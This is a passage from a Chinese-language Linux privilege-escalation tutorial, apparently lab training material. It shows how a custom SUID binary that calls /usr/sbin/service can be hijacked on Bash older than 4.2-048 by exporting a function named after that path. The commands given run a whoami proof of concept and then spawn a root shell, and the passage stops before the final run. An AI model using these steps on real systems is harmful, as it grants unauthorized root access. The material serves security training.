<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="419" height="47" class="img_ev3q"></p>
<blockquote>
<p>默认情况下，标准用户无法写入 /usr/bin目录。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="51函数--bash-的秘密力量"><strong><div id="id5.1">5.1、函数 – Bash 的秘密力量</div></strong><a href="#51函数--bash-的秘密力量" class="hash-link" aria-label="51函数--bash-的秘密力量的直接链接" title="51函数--bash-的秘密力量的直接链接">​</a></h4>
<p>由于自定义 suid-sf 二进制文件使用的是 service 二进制文件的绝对路径，而除非我们在二进制文件所在目录中拥有写入权限，否则无法利用这一点。</p>
<p>虽然这是事实，但这是片面的思维。</p>
<p>有时，事情并不总是表面上看起来的那么脆弱，但作为一名熟练的攻击者，我们需要知道如何拓展我们的思维。本质上，如果我们的直觉告诉我们某事看起来很脆弱，那么我们应该相信这种直觉。</p>
<p>话虽如此，我们仍需要进一步枚举，以尝试更好地理解执行该二进制文件时发生的所有情况。</p>
<p>在这种情况下，我们可以检查受害者上运行的 bash 版本。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/bin/bash --version</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630032-1320766704-306f12c1536b1779c6d1b39340803d9e.png" width="635" height="123" class="img_ev3q"></p>
<p>Great！我们可以看到这是 <strong>bash</strong> 的早期版本 – <strong>4.1.5</strong>。</p>
<blockquote>
<p>某些版本的 <code>Bash (&lt;4.2-048)</code> 允许您定义与绝对路径同名的函数。然后，它们的优先级高于实际的可执行文件本身。</p>
</blockquote>
<p>由于受害者运行的 bash 版本早于 4.2-048，因此 bash 的版本足够旧，允许我们自定义函数。</p>
<p>由于 bash 是我们的默认解释器，因此我们可以创建一个函数，然后将其导出到环境变量中。这将强制 /usr/sbin/service 执行我们选择的任意命令。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629402-1823238660-5d62e69090104cbae16225eb31a7c3d7.png" width="272" height="123" class="img_ev3q"></p>
<p>因为 SUID 位是在 <strong>suid-sf</strong> 二进制文件上发送的，所以它将以 root 身份执行 <strong>/usr/bin/service</strong> 并运行我们在函数中定义的命令。</p>
<p>现在让我们看看如何将 <strong>bash</strong> 漏洞与自定义 SUID 二进制文件链接在一起，以将我们的权限提升为 root。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="52使用-bash-函数获取-root-shell--利用一"><strong><div id="id5.2">5.2、使用 Bash 函数获取 Root Shell – 利用一</div></strong><a href="#52使用-bash-函数获取-root-shell--利用一" class="hash-link" aria-label="52使用-bash-函数获取-root-shell--利用一的直接链接" title="52使用-bash-函数获取-root-shell--利用一的直接链接">​</a></h4>
<p>此时，我们需要做的就是创建一个函数，用恶意内容覆盖 service 二进制文件的执行。</p>
<p>为了了解其工作原理，让我们做一个创建 whoami.txt 文件的 POC。</p>
<p>首先我们需要创建测试函数：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">function /usr/sbin/service() { whoami &gt; whoami.txt; }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>创建 POC 函数后，我们需要将其导出到环境变量中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">export -f /usr/sbin/service</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182630033-1632704657-601d7b8804de6785e1af232286272ebe.png" width="655" height="219" class="img_ev3q"></p>
<p>Perfect！可以看到我们的环境变量已经更新，并包含新创建的函数。</p>
<p>现在，我们所要做的就是运行 service 二进制文件，然后检查 /tmp 文件夹，查看是否创建了一个名为 whoami.txt 的新文件。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/usr/sbin/service</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240707182629747-897745171-b8a21513cf330286ed48a111ef76a7fb.png" width="516" height="127" class="img_ev3q"></p>
<p>POC 成功，这证实了 service 二进制文件正在使用我们创建的函数。</p>
<p>在确认该功能正常运行后，我们现在知道我们可以利用它来进行恶意攻击。</p>
<p>我们可以创建一个函数，将我们直接带入 root shell，如下所示：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">function /usr/sbin/service() { /bin/bash-p; }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在我们已经创建了恶意函数，我们需要再次将其导出到环境变量中。</p>
